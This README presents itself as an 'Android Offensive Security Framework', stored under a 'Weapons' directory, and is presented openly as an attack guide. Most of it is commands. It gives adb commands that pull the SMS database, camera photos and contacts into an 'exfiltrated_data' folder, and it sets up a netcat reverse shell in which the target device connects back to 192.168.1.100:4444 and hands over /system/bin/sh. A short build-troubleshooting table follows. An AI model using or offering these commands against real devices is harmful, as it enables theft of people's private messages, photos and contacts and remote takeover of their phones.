# Android Offensive Security Framework

## Immediate APK Build
Run the one-click build script:
```bash
cd ~/agent_zero_data/Weapons/mobile_attacks/android_to_android/
./build_apk.sh
```

## Offensive Deployment

### USB OTG Exploitation
```bash
# Extract SMS database
adb shell input text "su -c 'cat /data/data/com.android.providers.telephony/databases/mmssms.db'"

# Execute custom commands
adb shell "pm list packages -f"
```

### Data Exfiltration
```bash
# Pull camera photos
adb pull /sdcard/DCIM/Camera/ ~/exfiltrated_data/

# Exfiltrate contacts
adb shell "content query --uri content://contacts/phones" > contacts.txt
```

### Reverse Shell
```bash
# Start listener on host
nc -lvp 4444

# Execute reverse shell on target
adb shell "nc 192.168.1.100 4444 -e /system/bin/sh"
```

## Troubleshooting

| Issue                          | Solution                                                                                     |
|--------------------------------|---------------------------------------------------------------------------------------------|
| **Android SDK Not Found**      | Set `ANDROID_SDK_ROOT` or install Android Studio.                                          |
| **Java Not Found**             | Install OpenJDK 11: `sudo apt-get install -y openjdk-11-jdk`.                              |
| **Gradle Build Failed**        | Run `./gradlew clean` and retry `./gradlew assembleDebug`.                                 |
| **ADB Connection Issues**      | Verify USB debugging: `adb devices` and check authorization.                               |
